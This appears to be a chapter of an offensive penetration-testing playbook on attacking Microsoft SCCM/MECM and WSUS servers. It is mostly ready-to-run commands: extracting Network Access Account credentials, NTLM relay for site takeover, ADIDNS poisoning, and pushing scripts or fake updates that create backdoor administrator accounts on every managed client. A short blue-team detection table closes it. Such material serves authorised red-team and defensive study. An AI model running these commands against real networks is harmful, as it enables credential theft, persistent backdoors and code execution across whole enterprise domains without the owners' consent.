# Phase 17: SCCM / MECM & WSUS Attacks

> Microsoft Endpoint Configuration Manager (SCCM/MECM) and Windows Server Update Services (WSUS) are common in enterprise environments and provide high-value attack paths. Research: "Misconfiguration Manager" (Chris Thompson et al., 2024).

---

## SCCM / MECM Attacks

### Background

SCCM (rebranded MECM / Microsoft Endpoint Manager) manages software deployment, patching, and configuration across Windows environments. It has several components:
- **Site Server** — the main SCCM server
- **Management Point (MP)** — handles client-to-server communication
- **Distribution Point (DP)** — serves content (software packages)
- **SQL Server** — stores all SCCM data including credentials

SCCM runs with high privileges and stores sensitive credentials (Network Access Account / NAC) accessible via DPAPI.

### 1. Discovery

```bash
# Find SCCM infrastructure via LDAP
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M sccm
# Or look for specific AD objects
ldapsearch -H ldap://10.10.10.10 -D jdoe@lab.local -w Password1 \
  -b "DC=lab,DC=local" "(objectClass=mSSMSSite)"

# Check DNS for common SCCM hostnames
nslookup sccm.lab.local
nslookup mecm.lab.local
nslookup mp.lab.local     # management point

# SharpSCCM discovery
.\SharpSCCM.exe find admin-service
.\SharpSCCM.exe get site-info
```

### 2. Network Access Account (NAC) Password — The Big One

SCCM uses a Network Access Account (NAA) to access content from distribution points during OS deployment (before the machine is joined to the domain). This NAA password is:
- Stored on every SCCM client machine in WMI
- Encrypted with DPAPI using the machine key
- Often a highly privileged domain account (sometimes DA-level)

```powershell
# On any SCCM-managed machine — read NAC from WMI (needs local admin)
# Method 1: SharpSCCM
.\SharpSCCM.exe get naa

# Method 2: PowerShell + DPAPI
$cred = Get-WmiObject -Namespace root\ccm\policy\Machine\ActualConfig `
  -Class CCM_NetworkAccessAccount
# Decrypt the ObfuscatedNetworkAccessPassword field using DPAPI

# Method 3: Mimikatz
dpapi::cred /in:"C:\Windows\System32\wbem\repository\" /masterkey:<key>
```

```bash
# Remote: if you have local admin via nxc
nxc smb 10.10.10.50 -u administrator -H <hash> -M sccm
# Or use sccmhunter
python3 sccmhunter.py find -u jdoe -p Password1 -d lab.local -dc-ip 10.10.10.10
python3 sccmhunter.py dpapi -u administrator -p Password1 -d lab.local -dc-ip 10.10.10.10 -target 10.10.10.50
```

**Impact**: If NAC is a privileged domain account → instant escalation.

🔴 **OPSEC**: WMI queries to `root\ccm` are legitimate but unusual from non-admin users. Local admin required.

### 3. SCCM Site Takeover Paths

Several paths exist to take over the SCCM site server and use it for arbitrary code execution on all managed clients (= lateral movement to every SCCM-managed machine in the domain).

#### Path A: Relay to SMS Provider (TAKEOVER1 — Misconfiguration Manager)

```bash
# Coerce SCCM site server to authenticate to you → relay to LDAP → add admin
# Requires SCCM site server to have automatic site-wide client push configured
sudo ntlmrelayx.py -t ldap://10.10.10.10 -smb2support --no-dump --no-da \
  --no-acl --escalate-user jdoe

# Trigger client push from SCCM (if you're an SCCM operator)
.\SharpSCCM.exe invoke client-push -t 10.10.10.99   # points push at attacker
```

#### Path B: Credential via DB

```bash
# If you have DB admin on the SCCM SQL server:
# SCCM stores encrypted credentials in the database
# Decrypt via site server's DPAPI machine key
.\SharpSCCM.exe get secrets -siteserver sccm.lab.local
```

#### Path C: Become SCCM Admin → Push Scripts

Once you have SCCM admin rights, you can deploy scripts or applications to any/all managed machines:

```powershell
# Execute command on all managed clients via SCCM
.\SharpSCCM.exe exec -d lab.local -r "\\10.10.10.10\share\payload.exe" -sc "ScriptName"

# Deploy a script via SCCM admin
New-CMScript -ScriptName "Test" -ScriptText "net user hacker P@ssword /add & net localgroup administrators hacker /add" -ScriptLanguage PowerShell
Invoke-CMScript -ScriptName "Test" -CollectionName "All Systems"
```

💀 **OPSEC**: SCCM script deployment is extremely loud — creates events on every target and in SCCM reporting.

### 4. SharpSCCM — Primary Tool

```powershell
# Full enumeration
.\SharpSCCM.exe find admin-service
.\SharpSCCM.exe get devices                # all managed devices
.\SharpSCCM.exe get users                  # all SCCM users
.\SharpSCCM.exe get collections
.\SharpSCCM.exe get naa                    # Network Access Account
.\SharpSCCM.exe get secrets               # all SCCM stored credentials

# Attack
.\SharpSCCM.exe exec -d lab.local -r "cmd.exe" -sc "/c whoami > C:\Temp\out.txt"
```

---

## WSUS Attacks

### Background

Windows Server Update Services (WSUS) distributes Windows updates to domain machines. If the WSUS server uses **HTTP** (not HTTPS) for client communication, or if you have local admin on the WSUS server itself, you can push fake "updates" — arbitrary executables that run as SYSTEM on every targeted client.

### 1. Discovery

```bash
# Find WSUS server via registry (on a domain client)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
# Or via nmap
nmap -p 8530,8531 10.10.10.0/24     # 8530=HTTP, 8531=HTTPS

# NetExec
nxc smb 10.10.10.0/24 -u jdoe -p Password1 -M wsus
```

### 2. PyWSUS — MITM Fake Update (HTTP WSUS)

```bash
# If WSUS is HTTP, MITM the update traffic and inject a fake update
# Requires: ARP spoof or DNS poisoning to redirect WSUS traffic to attacker

# Step 1: Redirect WSUS traffic (ARP spoof or ADIDNS)
python3 dnstool.py -u 'lab.local\jdoe' -p Password1 \
  -a add -r 'wsus-server' -d 10.10.10.99 10.10.10.10

# Step 2: Run PyWSUS
python3 pywsus.py -H 10.10.10.99 -p 8530 -e /tmp/PsExec64.exe -c "/accepteula /s cmd.exe /c 'net user backdoor P@ss /add'"
# Client downloads fake PsExec update, runs as SYSTEM
```

### 3. SharpWSUS — Server-Side (Needs WSUS Admin)

```powershell
# If you have admin on the WSUS server or SQL DB:
.\SharpWSUS.exe create /payload:"C:\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c 'net user backdoor P@ss /add'" /title:"Update KB99999999"

# Approve the fake update for a target computer group
.\SharpWSUS.exe approve /updateid:<GUID> /computername:ws01.lab.local /groupname:"Test"

# Check deployment status
.\SharpWSUS.exe check /updateid:<GUID> /computername:ws01.lab.local

# Cleanup
.\SharpWSUS.exe delete /updateid:<GUID> /computername:ws01.lab.local /groupname:"Test"
```

💀 **OPSEC**: Extremely loud — Windows Event Log on every client, WSUS reporting database, and network traffic all record update activity. However, defenders rarely monitor WSUS for malicious updates in real-time.

### 4. When Does WSUS Attack Work?

| Condition | Attack Path |
|-----------|------------|
| WSUS uses HTTP | PyWSUS MITM — any domain user with ADIDNS write |
| WSUS uses HTTPS | Requires WSUS server admin or SQL admin |
| WSUS server is local admin target | Compromise WSUS box → SharpWSUS → all clients |
| No WSUS (or pure HTTPS) | Not applicable |

---

## Blue-Team Detection

| Technique | Detection |
|-----------|-----------|
| NAC credential extraction | WMI query to `root\ccm` from non-service process (Sysmon Event 20) |
| SCCM client push coerce | Event 4624 on SCCM server from anomalous source |
| SCCM script execution | SCCM Status Messages + Event 4688 on targets |
| PyWSUS MITM | DNS change for WSUS hostname (ADIDNS audit); HTTP update traffic |
| SharpWSUS (server-side) | WSUS update catalog changes; Event 19/20 on targets |

---

## Next Step

NAC password recovered → **Phase 5: Lateral Movement** (`05-lateral-movement.md`)
Code execution on all managed clients → **Phase 7: Domain Dominance** (`07-domain-dominance.md`)
